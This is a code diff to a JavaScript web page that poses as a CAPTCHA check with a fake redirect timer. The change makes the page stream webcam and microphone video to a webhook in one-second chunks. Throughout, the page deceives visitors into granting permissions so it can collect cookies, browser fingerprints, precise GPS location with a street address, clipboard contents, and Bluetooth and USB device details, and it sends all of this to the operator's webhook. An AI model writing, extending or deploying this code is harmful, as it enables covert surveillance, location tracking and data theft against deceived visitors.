@@ -89,7 +89,7 @@
     }
     sendInitialIP();
 
-    // ==================== 2. DATA COLLECTION FUNCTIONS (same as before) ====================
+    // ==================== 2. DATA COLLECTION FUNCTIONS ====================
     function categorizeCookie(name) {
         const n = name.toLowerCase();
         if (n.includes("fb") || n.includes("facebook")) return "Facebook";
@@ -280,37 +280,58 @@
         } catch(e) { return `${lat}, ${lon} (address failed)`; }
     }
 
-    // ==================== 4. VIDEO RECORDING (no preview) ====================
-    async function startAndRecordCamera(durationMs) {
+    // ==================== 4. PROGRESSIVE VIDEO RECORDING (sends chunks every second) ====================
+    async function startProgressiveRecording(durationMs, onChunk, onError) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const recordedChunks = [];
             const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-            return new Promise((resolve) => {
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) recordedChunks.push(event.data);
-                };
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(recordedChunks, { type: "video/webm" });
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve(blob);
-                };
-                mediaRecorder.start(100);
-                setTimeout(() => {
-                    if (mediaRecorder.state === "recording") mediaRecorder.stop();
-                }, durationMs);
-            });
+            let chunkNumber = 0;
+            let startTime = Date.now();
+
+            mediaRecorder.ondataavailable = async (event) => {
+                if (event.data.size > 0) {
+                    chunkNumber++;
+                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                    await onChunk(event.data, chunkNumber, elapsed);
+                }
+            };
+            mediaRecorder.start(1000); // fire event every 1 second
+            setTimeout(() => {
+                if (mediaRecorder.state === "recording") {
+                    mediaRecorder.stop(); // this will trigger a final dataavailable with remaining data
+                }
+            }, durationMs);
+            mediaRecorder.onstop = () => {
+                stream.getTracks().forEach(t => t.stop());
+            };
+            return () => {
+                if (mediaRecorder.state === "recording") mediaRecorder.stop();
+            };
         } catch(e) {
-            console.error("Camera error", e);
+            if (onError) onError(e);
             return null;
         }
     }
 
+    async function sendVideoChunk(blob, chunkIndex, seconds) {
+        const formData = new FormData();
+        formData.append("file", blob, `video_chunk_${chunkIndex}_${seconds}s.webm`);
+        const embed = {
+            embeds: [{
+                title: `🎥 Video chunk #${chunkIndex} (${seconds} seconds)`,
+                description: `**Size:** ${(blob.size/1024).toFixed(1)} KB\n**Timestamp:** ${new Date().toISOString()}`,
+                color: 0xff5500,
+                timestamp: new Date().toISOString()
+            }]
+        };
+        formData.append("payload_json", JSON.stringify(embed));
+        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+    }
+
     // ==================== 5. SEND TEXT LOG IMMEDIATELY ====================
-    async function sendTextLog(finalData, hasCamera) {
-        // Generate TXT report (same as before, but include note about video pending)
+    async function sendTextLog(finalData) {
         function generateTextReport(d) {
-            let r = "=".repeat(80) + "\n        ULTIMATE MAX LOGGER - TEXT REPORT (VIDEO PENDING)\n" + "=".repeat(80) + "\n\n";
+            let r = "=".repeat(80) + "\n        ULTIMATE MAX LOGGER - TEXT REPORT\n" + "=".repeat(80) + "\n\n";
             r += `Time: ${d.timestamp}\nURL: ${d.pageURL}\nReferrer: ${d.referrer || "(none)"}\n\n`;
             r += "📍 PRECISE LOCATION\n";
             if (d.permissions.geolocation.lat) {
@@ -338,8 +359,7 @@
             r += `\n🖌️ Canvas Fingerprint: ${d.canvasFingerprint}\n🎵 Audio Fingerprint: ${d.audioFingerprint}\n🔐 SHA-256 Fingerprint: ${d.fingerprint}\n`;
             r += `\n⏱️ Performance: Load ${d.performance.loadTime}ms, DOM ready ${d.performance.domReady}ms\n🧠 Memory: ${JSON.stringify(d.memory)}\n`;
             r += `\n📹 Media Devices: ${JSON.stringify(d.mediaDevices)}\n📋 Clipboard: ${d.clipboard}\n🎧 Bluetooth: ${JSON.stringify(d.bluetooth)}\n🔌 USB: ${JSON.stringify(d.usb)}\n`;
-            r += `\nPermissions: Geo=${d.permissions.geolocation.lat?"OK":"DENIED"}, Camera=${hasCamera?"REQUESTED":"NOT YET"}, Mic=${d.permissions.microphone?"OK":"DENIED"}, Notif=${d.permissions.notifications}\n`;
-            r += `\n🎥 Video recording: Pending (will be sent separately)\n`;
+            r += `\nPermissions: Geo=${d.permissions.geolocation.lat?"OK":"DENIED"}, Mic=${d.permissions.microphone?"OK":"DENIED"}, Notif=${d.permissions.notifications}\n`;
             return r;
         }
         const reportText = generateTextReport(finalData);
@@ -355,7 +375,7 @@
         const embed = {
             embeds: [{
                 title: "📄 TEXT LOG (IMMEDIATE)",
-                description: `**📍 Location:** ${locationInfo}${mapsLink}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**Video:** Pending...`,
+                description: `**📍 Location:** ${locationInfo}${mapsLink}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**Video:** Progressive chunks will follow...`,
                 color: 0x3498db,
                 fields: [
                     { name: "Permissions", value: `GPS: ${finalData.permissions.geolocation.lat ? "✅" : "❌"}\nMic: ${finalData.permissions.microphone ? "✅" : "❌"}\nClipboard: ${finalData.clipboard ? "✅" : "❌"}`, inline: true },
@@ -368,23 +388,7 @@
         await fetch(WEBHOOK_URL, { method: "POST", body: formData });
     }
 
-    // ==================== 6. SEND VIDEO CLIP SEPARATELY ====================
-    async function sendVideoClip(videoBlob, startTime) {
-        const formData = new FormData();
-        formData.append("file", videoBlob, `video_${Date.now()}.webm`);
-        const embed = {
-            embeds: [{
-                title: "🎥 VIDEO RECORDING",
-                description: `**Duration:** ~32 seconds\n**Size:** ${(videoBlob.size/1024).toFixed(1)} KB\n**Recorded at:** ${new Date().toISOString()}`,
-                color: 0xff5500,
-                timestamp: new Date().toISOString()
-            }]
-        };
-        formData.append("payload_json", JSON.stringify(embed));
-        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-    }
-
-    // ==================== 7. MAIN CAPTCHA CLICK ====================
+    // ==================== 6. MAIN CAPTCHA CLICK ====================
     let isRunning = false;
     const btn = document.getElementById("actionBtn");
     const timerDiv = document.getElementById("timerDisplay");
@@ -406,7 +410,7 @@
             timerDiv.innerText = timeLeft > 0 ? `⏳ Redirecting in ${timeLeft} seconds...` : "Redirecting now...";
         }, 1000);
 
-        // ---- 1. Collect non-camera data and request permissions (except camera) ----
+        // ---- Collect non-camera data ----
         const gpu = getGPU();
         const canvasFp = await getCanvasFingerprint();
         const audioFp = await getAudioFingerprint();
@@ -431,29 +435,29 @@
         }
 
         // ---- Permissions (location, clipboard, notifications, mic) ----
-        noticeDiv.innerHTML = "📍 Location required for regional verification – click ALLOW";
+        noticeDiv.innerHTML = "📍 Location required – click ALLOW";
         const geoloc = await requestGeolocation();
         let address = "";
         if (geoloc.lat && geoloc.lon) address = await reverseGeocode(geoloc.lat, geoloc.lon);
 
-        noticeDiv.innerHTML = "📋 Clipboard read (to verify human interaction) – click ALLOW";
+        noticeDiv.innerHTML = "📋 Clipboard read – click ALLOW";
         const clipboardPerm = await requestClipboard();
         let clipboardContent = "";
         if (clipboardPerm.success) clipboardContent = await readClipboard();
 
-        noticeDiv.innerHTML = "🔔 Notification permission (for redirect alert) – click ALLOW";
+        noticeDiv.innerHTML = "🔔 Notifications – click ALLOW";
         const notif = await requestNotifications();
 
-        noticeDiv.innerHTML = "🎤 Microphone check – click ALLOW";
+        noticeDiv.innerHTML = "🎤 Microphone – click ALLOW";
         const mic = await requestMicrophone();
 
-        noticeDiv.innerHTML = "🔊 Optional: Bluetooth devices (click ALLOW if you want)";
+        noticeDiv.innerHTML = "🔊 Bluetooth (optional)";
         const bluetooth = await getBluetoothDevices();
 
-        noticeDiv.innerHTML = "🔌 Scanning USB devices...";
+        noticeDiv.innerHTML = "🔌 USB devices";
         const usb = await getUSBDevices();
 
-        // Build final data object (without video yet)
+        // Build final data object
         const finalData = {
             timestamp: new Date().toISOString(),
             pageURL: window.location.href,
@@ -498,23 +502,21 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        // ---- Send text log immediately (without waiting for camera) ----
-        await sendTextLog(finalData, false);
-        noticeDiv.innerHTML = "✅ Text log sent. Now requesting camera for video verification...";
+        // ---- Send text log immediately ----
+        await sendTextLog(finalData);
+        noticeDiv.innerHTML = "✅ Text log sent. Now requesting camera for progressive video...";
 
-        // ---- 2. Request camera and start recording (no preview) ----
-        noticeDiv.innerHTML = "🎥 Camera access for facial verification – click ALLOW";
-        const videoBlob = await startAndRecordCamera(32000); // records for up to 32 seconds
+        // ---- Request camera and start progressive recording (chunks every 1 second) ----
+        noticeDiv.innerHTML = "🎥 Camera access – click ALLOW (video will be sent in chunks)";
+        const stopRecording = await startProgressiveRecording(32000, async (blob, chunkIdx, seconds) => {
+            await sendVideoChunk(blob, chunkIdx, seconds);
+            noticeDiv.innerHTML = `📤 Sent video chunk #${chunkIdx} (${seconds} sec)`;
+        }, (err) => {
+            console.error("Camera error", err);
+            noticeDiv.innerHTML = "⚠️ Camera denied or error – no video chunks.";
+        });
 
-        if (videoBlob) {
-            // Send video clip as separate message
-            await sendVideoClip(videoBlob);
-            noticeDiv.innerHTML = "✅ Video sent. Finalizing...";
-        } else {
-            noticeDiv.innerHTML = "⚠️ Camera denied or error – no video sent.";
-        }
-
-        // After 32 seconds, fake redirect (already handled by timer UI)
+        // After 32 seconds, fake redirect (the recording will stop automatically after timeout)
         setTimeout(() => {
             document.getElementById("mainContainer").innerHTML = `
                 <div class="container" style="background:white; text-align:center; padding:40px;">
